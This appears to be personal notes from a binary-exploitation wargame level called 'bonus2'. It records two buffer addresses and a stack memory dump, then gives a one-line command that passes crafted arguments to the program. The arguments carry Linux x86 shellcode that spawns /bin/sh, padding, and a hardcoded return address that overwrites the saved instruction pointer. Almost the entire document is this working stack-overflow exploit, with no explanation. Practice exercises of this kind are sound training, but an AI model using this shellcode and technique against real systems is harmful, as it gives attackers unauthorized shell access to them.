buffer1 start: 0xbffff600

buffer2 start: 0xbffff660



0xbffff580:	                                	0xbffff64c
0xbffff590:	0xbffff668	0xb7ff26b0	0xbfffff25	0xb7f5d780
0xbffff5a0:	0xbfffff28	0xb7fff918	0xbffff668	0x08048630


./bonus2 $(python -c 'print("\x34\xf6\xff\xbf" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "B"*15)') $(python -c 'print("C"*23 + "\x30\xf6\xff\xbf")')
